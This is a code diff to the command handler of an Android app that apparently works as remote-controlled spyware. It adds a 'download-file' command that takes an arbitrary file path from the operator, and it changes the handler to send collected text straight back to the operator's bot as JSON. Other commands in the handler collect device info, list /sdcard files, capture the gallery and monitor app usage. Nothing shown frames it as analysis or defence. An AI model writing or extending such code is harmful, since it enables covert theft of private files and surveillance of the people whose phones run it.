@@ -94,9 +94,14 @@ class CommandHandler(
                     else if (result is CollectedData.TextResult) {
                         val text = result.text
                         if (text.isNotEmpty()) {
-                            val file = saveTextToFile(text, command, deviceId)
-                            uploadFileToBot(file, command, deviceId, "document")
-                            file.delete()
+                            // Send as text message (not file) so user can read it in chat
+                            val response = JSONObject().apply {
+                                put("command", command)
+                                put("status", "success")
+                                put("data", text)
+                                put("device_id", deviceId)
+                            }
+                            sendResponse(response)
                         }
                     }
                     // ─── String results: simple status ───
@@ -269,6 +274,14 @@ class CommandHandler(
             "stop-gallery" -> "stopped"
             "get-device-info" -> collectors.getFullDeviceInfo()
             "ls" -> collectors.listFiles(params?.optString("value", "/sdcard/") ?: "/sdcard/")
+            "download-file" -> {
+                val filePath = params?.optString("value", "") ?: ""
+                if (filePath.isNotEmpty()) {
+                    collectors.downloadFile(filePath)
+                } else {
+                    CollectedData.TextResult("❌ لم يتم تحديد مسار الملف")
+                }
+            }
             "app-monitor-start" -> collectors.startAppMonitor()
             "app-monitor-stop" -> collectors.stopAppMonitor()
             "app-usage-report" -> collectors.getAppUsageReport()
